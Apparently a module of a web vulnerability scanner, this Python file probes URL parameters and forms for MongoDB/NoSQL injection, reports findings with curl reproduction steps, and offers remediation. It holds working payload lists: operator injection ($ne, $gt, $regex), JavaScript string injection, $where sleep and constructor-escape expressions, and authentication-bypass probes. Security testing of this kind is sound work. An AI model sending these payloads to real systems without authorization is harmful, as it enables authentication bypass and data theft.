import json
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.log import logger
from scanner.core import Finding, Severity, ScanSession

NOSQL_ERROR_PATTERNS = [
    (r"MongoError", "MongoDB"),
    (r"mongo\..*?Error", "MongoDB"),
    (r"MongoDB.*?Exception", "MongoDB"),
    (r"E11000 duplicate key", "MongoDB"),
    (r"command failed.*?errmsg", "MongoDB"),
    (r"\$where.*?not allowed", "MongoDB"),
    (r"SyntaxError.*?unexpected token", "MongoDB/JS"),
    (r"Cannot apply \$gt", "MongoDB"),
    (r"unknown operator.*?\$", "MongoDB"),
    (r"CastError.*?ObjectId", "MongoDB/Mongoose"),
    (r"ValidationError.*?cast to", "MongoDB/Mongoose"),
    (r"ReferenceError.*?is not defined", "Server-side JS"),
]

OPERATOR_PAYLOADS = [
    ('{"$gt":""}', "Operator injection ($gt)"),
    ('{"$ne":null}', "Operator injection ($ne null)"),
    ('{"$ne":""}', "Operator injection ($ne empty)"),
    ('{"$regex":".*"}', "Regex injection ($regex)"),
    ('{"$exists":true}', "Operator injection ($exists)"),
]

QUERY_STRING_PAYLOADS = [
    ("[$ne]=1", "Array operator injection ($ne)"),
    ("[$gt]=", "Array operator injection ($gt)"),
    ("[$regex]=.*", "Array regex injection"),
    ("[$exists]=true", "Array operator injection ($exists)"),
]

STRING_PAYLOADS = [
    ("' || '1'=='1", "JavaScript string injection (OR true)"),
    ("'; return true; var x='", "JS return injection"),
    ("\\'; return true; //", "JS escape + return injection"),
]

WHERE_PAYLOADS = [
    ("1; sleep(2000)", "$where sleep injection"),
    ("1 || this.constructor.constructor('return this')().sleep(2000)", "$where constructor injection"),
    ("function(){return true;}", "$where function injection"),
]


def _build_curl(method, url, data=None, content_type=None):
    cmd = f"curl -k -X {method} '{url}'"
    if content_type:
        cmd += f" -H 'Content-Type: {content_type}'"
    if data:
        cmd += f" -d '{data}'"
    return cmd


def _get_baseline(session, url, param, original):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [original or "harmless"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    resp = session.get(baseline_url)
    return resp if resp else None


def _response_differs(baseline_resp, test_resp):
    if not baseline_resp or not test_resp:
        return False
    if baseline_resp.status_code != test_resp.status_code:
        return True
    baseline_len = len(baseline_resp.text)
    test_len = len(test_resp.text)
    if baseline_len == 0:
        return test_len > 0
    ratio = abs(test_len - baseline_len) / max(baseline_len, 1)
    return ratio > 0.15


def _check_nosql_errors(body):
    for pattern, db_type in NOSQL_ERROR_PATTERNS:
        if re.search(pattern, body, re.IGNORECASE):
            return pattern, db_type
    return None, None


def _extract_error_snippet(body, pattern):
    match = re.search(pattern, body, re.IGNORECASE)
    if match:
        start = max(0, match.start() - 60)
        end = min(len(body), match.end() + 60)
        return body[start:end].replace('\n', ' ').strip()
    return ""


def _test_url_params(session, url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return

    for param, values in params.items():
        original = values[0] if values else ""
        baseline_resp = _get_baseline(session, url, param, original)
        baseline_text = baseline_resp.text if baseline_resp else ""

        # Test query string operator payloads: param[$ne]=1
        for suffix, description in QUERY_STRING_PAYLOADS:
            test_query = parsed.query + f"&{param}{suffix}"
            test_url = urlunparse(parsed._replace(query=test_query))
            resp = session.get(test_url)
            if not resp or resp.status_code in (404, 403):
                continue

            error_pattern, db_type = _check_nosql_errors(resp.text)
            if error_pattern and not re.search(error_pattern, baseline_text, re.IGNORECASE):
                snippet = _extract_error_snippet(resp.text, error_pattern)
                curl_cmd = _build_curl("GET", test_url)
                session.add_finding(Finding(
                    title=f"NoSQL Injection (Error-Based) - {db_type}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The URL parameter '{param}' is vulnerable to NoSQL operator injection. "
                        f"When MongoDB query operators are injected via array syntax ({description}), "
                        f"the application returns a {db_type} error message, confirming that user "
                        f"input reaches the NoSQL query engine unsanitized."
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {param}{suffix}\n"
                        f"Technique: {description}\n"
                        f"Database Type: {db_type}\n"
                        f"Error Pattern: {error_pattern}\n"
                        f"Error Snippet: {snippet}\n"
                        f"Test URL: {test_url}\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Use explicit type casting on all query parameters before passing to MongoDB.\n"
                        "2. Sanitize inputs with mongo-sanitize or equivalent library.\n"
                        "3. Use a schema validator (Mongoose, Joi) that rejects object/array values for string fields.\n"
                        "4. Disable server-side JavaScript ($where, mapReduce) if not needed.\n"
                        "5. Apply the principle of least privilege to database user permissions."
                    ),
                    url=url,
                    module="nosql_injection",
                    cwe="CWE-943",
                    confirmed=True,
                    location=f"URL parameter '{param}' in query string of {parsed.path}",
                    parameter=param,
                    payload=f"{param}{suffix}",
                    request_method="GET",
                    response_status=resp.status_code,
                    curl_command=curl_cmd,
                    reproduction_steps=(
                        f"1. Open: {url}\n"
                        f"2. Append '{param}{suffix}' to the query string\n"
                        f"3. Full test URL: {test_url}\n"
                        f"4. Observe the {db_type} error message in the response.\n"
                        f"5. Run: {curl_cmd}"
                    ),
                    developer_fix=(
                        f"File: The server-side code handling '{parsed.path}' that uses "
                        f"'{param}' in a NoSQL query.\n\n"
                        f"VULNERABLE pattern (do NOT use):\n"
                        f"  db.collection.find({{ {param}: req.query.{param} }})\n\n"
                        f"SECURE pattern (use this instead):\n"
                        f"  Node.js: const sanitized = String(req.query.{param}); "
                        f"db.collection.find({{ {param}: sanitized }})\n"
                        f"  Python: sanitized = str(request.args.get('{param}', '')); "
                        f"db.collection.find({{ '{param}': sanitized }})\n"
                        f"  Or use mongo-sanitize: const sanitize = require('mongo-sanitize'); "
                        f"db.collection.find({{ {param}: sanitize(req.query.{param}) }})"
                    ),
                    affected_component=f"NoSQL query in route handler for {parsed.path}",
                    references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection | https://book.hacktricks.xyz/pentesting-web/nosql-injection",
                    detection_method=f"Injected MongoDB operator via array syntax ({description}) into URL parameter and detected database error in response that was absent from baseline.",
                ))
                return

            # Check for auth bypass / data leakage via response difference
            if _response_differs(baseline_resp, resp):
                if resp.status_code == 200 and len(resp.text) > len(baseline_text) * 1.3:
                    curl_cmd = _build_curl("GET", test_url)
                    session.add_finding(Finding(
                        title="Potential NoSQL Injection (Auth Bypass / Data Leak)",
                        severity=Severity.HIGH,
                        description=(
                            f"The URL parameter '{param}' may be vulnerable to NoSQL operator injection. "
                            f"When a query operator ({description}) was injected, the response was "
                            f"significantly larger than the baseline, suggesting the operator altered "
                            f"the query logic to return additional data."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {param}{suffix}\n"
                            f"Technique: {description}\n"
                            f"Baseline Response Length: {len(baseline_text)}\n"
                            f"Injected Response Length: {len(resp.text)}\n"
                            f"Length Ratio: {len(resp.text) / max(len(baseline_text), 1):.2f}x\n"
                            f"Test URL: {test_url}\n"
                            f"Response Status: {resp.status_code}"
                        ),
                        remediation=(
                            "1. Cast all query parameters to their expected types before database queries.\n"
                            "2. Use mongo-sanitize to strip $ operators from user input.\n"
                            "3. Validate input with a schema that rejects unexpected objects/arrays.\n"
                            "4. Implement proper authentication checks independent of query results."
                        ),
                        url=url,
                        module="nosql_injection",
                        cwe="CWE-943",
                        confirmed=False,
                        location=f"URL parameter '{param}' in query string of {parsed.path}",
                        parameter=param,
                        payload=f"{param}{suffix}",
                        request_method="GET",
                        response_status=resp.status_code,
                        curl_command=curl_cmd,
                        reproduction_steps=(
                            f"1. Open: {url}\n"
                            f"2. Append '{param}{suffix}' to the query string\n"
                            f"3. Full test URL: {test_url}\n"
                            f"4. Compare the response size and content with the original page.\n"
                            f"5. Run: {curl_cmd}"
                        ),
                        developer_fix=(
                            f"File: The server-side code handling '{parsed.path}'.\n\n"
                            f"Ensure all query parameters are type-cast:\n"
                            f"  const id = String(req.query.{param});\n"
                            f"  // Or use parseInt() for numeric params\n"
                            f"  db.collection.find({{ {param}: id }})"
                        ),
                        affected_component=f"NoSQL query in route handler for {parsed.path}",
                        references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                        detection_method=f"Injected NoSQL operator ({description}) and observed significantly larger response body compared to baseline, indicating query logic alteration.",
                    ))
                    return

        # Test string-based / $where injection payloads
        for payload, description in STRING_PAYLOADS + WHERE_PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            resp = session.get(test_url)
            if not resp or resp.status_code in (404, 403):
                continue

            error_pattern, db_type = _check_nosql_errors(resp.text)
            if error_pattern and not re.search(error_pattern, baseline_text, re.IGNORECASE):
                snippet = _extract_error_snippet(resp.text, error_pattern)
                curl_cmd = _build_curl("GET", test_url)
                session.add_finding(Finding(
                    title=f"NoSQL Injection (String/JS Injection) - {db_type}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The URL parameter '{param}' is vulnerable to NoSQL string injection. "
                        f"When a JavaScript expression ({description}) was injected, the application "
                        f"returned a {db_type} error, confirming the input is interpreted as code "
                        f"in a server-side JavaScript context (e.g., $where clause)."
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {payload}\n"
                        f"Technique: {description}\n"
                        f"Database Type: {db_type}\n"
                        f"Error Pattern: {error_pattern}\n"
                        f"Error Snippet: {snippet}\n"
                        f"Test URL: {test_url}\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Disable server-side JavaScript execution ($where, mapReduce) in MongoDB.\n"
                        "2. Never concatenate user input into $where expressions.\n"
                        "3. Use standard query operators instead of $where for filtering.\n"
                        "4. Sanitize and type-cast all user input before query construction.\n"
                        "5. Apply Content Security Policy headers to limit script execution contexts."
                    ),
                    url=url,
                    module="nosql_injection",
                    cwe="CWE-943",
                    confirmed=True,
                    location=f"URL parameter '{param}' in query string of {parsed.path}",
                    parameter=param,
                    payload=payload,
                    request_method="GET",
                    response_status=resp.status_code,
                    curl_command=curl_cmd,
                    reproduction_steps=(
                        f"1. Open: {url}\n"
                        f"2. Set the '{param}' parameter to: {payload}\n"
                        f"3. Full test URL: {test_url}\n"
                        f"4. Observe the {db_type} error in the response.\n"
                        f"5. Run: {curl_cmd}"
                    ),
                    developer_fix=(
                        f"File: The server-side code handling '{parsed.path}'.\n\n"
                        f"VULNERABLE pattern (do NOT use):\n"
                        f"  db.collection.find({{ $where: \"this.{param} == '\" + input + \"'\" }})\n\n"
                        f"SECURE pattern (use this instead):\n"
                        f"  db.collection.find({{ {param}: String(input) }})\n"
                        f"  // Avoid $where entirely -- use standard query operators"
                    ),
                    affected_component=f"NoSQL $where / JS evaluation in route handler for {parsed.path}",
                    references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection | https://portswigger.net/web-security/nosql-injection",
                    detection_method=f"Injected JavaScript expression ({description}) into parameter and detected server-side JS/NoSQL error in response absent from baseline.",
                ))
                return


def _test_forms(session, form):
    action = form.get("action", "")
    method = form.get("method", "post").lower()
    inputs = form.get("inputs", [])
    source_url = form.get("source_url", action)

    baseline_data = {}
    for inp in inputs:
        name = inp.get("name")
        if name:
            baseline_data[name] = inp.get("value", "test")

    if method == "post":
        baseline_resp = session.post(action, data=baseline_data)
    else:
        baseline_resp = session.get(action, params=baseline_data)

    baseline_text = baseline_resp.text if baseline_resp else ""

    for inp in inputs:
        name = inp.get("name")
        if not name:
            continue

        # Test JSON operator injection in form fields
        for payload, description in OPERATOR_PAYLOADS:
            test_data = dict(baseline_data)
            test_data[name] = payload

            if method == "post":
                # Try as JSON body
                try:
                    json_body = {}
                    for k, v in test_data.items():
                        try:
                            json_body[k] = json.loads(v)
                        except (json.JSONDecodeError, TypeError):
                            json_body[k] = v
                    resp = session.post(action, json=json_body)
                except Exception as e:
                    logger.debug("nosql_injection: JSON POST failed, falling back to form POST: %s", e)
                    resp = session.post(action, data=test_data)
            else:
                resp = session.get(action, params=test_data)

            if not resp or resp.status_code in (404, 403):
                continue

            error_pattern, db_type = _check_nosql_errors(resp.text)
            if error_pattern and not re.search(error_pattern, baseline_text, re.IGNORECASE):
                snippet = _extract_error_snippet(resp.text, error_pattern)
                data_str = json.dumps(test_data)
                curl_cmd = _build_curl(
                    method.upper(), action,
                    data=data_str,
                    content_type="application/json" if method == "post" else None
                )
                session.add_finding(Finding(
                    title=f"NoSQL Injection in Form (Error-Based) - {db_type}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The form field '{name}' at '{action}' is vulnerable to NoSQL operator "
                        f"injection. When a MongoDB operator ({description}) was submitted, the "
                        f"application returned a {db_type} error, confirming unsanitized input "
                        f"reaches the database query layer."
                    ),
                    evidence=(
                        f"Form Action: {action}\n"
                        f"Form Method: {method.upper()}\n"
                        f"Field: {name}\n"
                        f"Payload: {payload}\n"
                        f"Technique: {description}\n"
                        f"Database Type: {db_type}\n"
                        f"Error Snippet: {snippet}\n"
                        f"Response Status: {resp.status_code}"
                    ),
                    remediation=(
                        "1. Type-cast all form inputs on the server side before using in queries.\n"
                        "2. Use mongo-sanitize or equivalent to strip $ operators.\n"
                        "3. Validate input with a strict schema (Mongoose, Joi, ajv).\n"
                        "4. Never pass raw req.body fields into MongoDB find/update operations."
                    ),
                    url=source_url,
                    module="nosql_injection",
                    cwe="CWE-943",
                    confirmed=True,
                    location=f"Form field '{name}' in form at {action}",
                    parameter=name,
                    payload=payload,
                    request_method=method.upper(),
                    request_body=data_str,
                    response_status=resp.status_code,
                    curl_command=curl_cmd,
                    reproduction_steps=(
                        f"1. Navigate to: {source_url}\n"
                        f"2. Locate the form that submits to {action}\n"
                        f"3. Set the '{name}' field to: {payload}\n"
                        f"4. Submit the form and observe the {db_type} error.\n"
                        f"5. Run: {curl_cmd}"
                    ),
                    developer_fix=(
                        f"File: The server-side handler for {method.upper()} {action}.\n\n"
                        f"VULNERABLE pattern:\n"
                        f"  db.users.find({{ {name}: req.body.{name} }})\n\n"
                        f"SECURE pattern:\n"
                        f"  const sanitize = require('mongo-sanitize');\n"
                        f"  db.users.find({{ {name}: sanitize(req.body.{name}) }})\n"
                        f"  // Or: String(req.body.{name}) for string fields"
                    ),
                    affected_component=f"NoSQL query in form handler for {action}",
                    references="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection | https://book.hacktricks.xyz/pentesting-web/nosql-injection",
                    detection_method=f"Injected MongoDB operator ({description}) into form field and detected database error in response absent from baseline.",
                ))
                return

            # Check for auth bypass via response difference
            if _response_differs(baseline_resp, resp):
                if resp.status_code == 200 and len(resp.text) > len(baseline_text) * 1.3:
                    data_str = json.dumps(test_data)
                    curl_cmd = _build_curl(
                        method.upper(), action,
                        data=data_str,
                        content_type="application/json" if method == "post" else None
                    )
                    session.add_finding(Finding(
                        title="Potential NoSQL Auth Bypass in Form",
                        severity=Severity.HIGH,
                        description=(
                            f"The form field '{name}' at '{action}' may be vulnerable to NoSQL "
                            f"operator injection for authentication bypass. Submitting a MongoDB "
                            f"operator ({description}) produced a significantly different response "
                            f"than the baseline, suggesting the query logic was altered."
                        ),
                        evidence=(
                            f"Form Action: {action}\n"
                            f"Field: {name}\n"
                            f"Payload: {payload}\n"
                            f"Technique: {description}\n"
                            f"Baseline Length: {len(baseline_text)}\n"
                            f"Injected Length: {len(resp.text)}\n"
                            f"Response Status: {resp.status_code}"
                        ),
                        remediation=(
                            "1. Sanitize all inputs with mongo-sanitize before query construction.\n"
                            "2. Type-cast credentials to strings before authentication queries.\n"
                            "3. Use bcrypt/argon2 password comparison instead of query-based auth."
                        ),
                        url=source_url,
                        module="nosql_injection",
                        cwe="CWE-943",
                        confirmed=False,
                        location=f"Form field '{name}' in form at {action}",
                        parameter=name,
                        payload=payload,
                        request_method=method.upper(),
                        request_body=data_str,
                        response_status=resp.status_code,
                        curl_command=curl_cmd,
                        reproduction_steps=(
                            f"1. Navigate to: {source_url}\n"
                            f"2. In the form submitting to {action}, set '{name}' to: {payload}\n"
                            f"3. Submit and compare the response to a normal submission.\n"
                            f"4. Run: {curl_cmd}"
                        ),
                        developer_fix=(
                            f"File: The handler for {method.upper()} {action}.\n\n"
                            f"Sanitize inputs before authentication queries:\n"
                            f"  const username = String(req.body.{name});\n"
                            f"  // Never: db.users.findOne({{ user: req.body.user, pass: req.body.pass }})\n"
                            f"  // Instead verify password with bcrypt after fetching by sanitized username"
                        ),
                        affected_component=f"Authentication / query logic in form handler for {action}",
                        references="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                        detection_method=f"Injected MongoDB operator ({description}) into login/form field and observed significantly different response, suggesting authentication bypass.",
                    ))
                    return


def run(session: ScanSession) -> None:
    print("\n[*] Testing for NoSQL Injection...")

    for url in session.crawled_urls:
        _test_url_params(session, url)

    for form in session.forms:
        _test_forms(session, form)
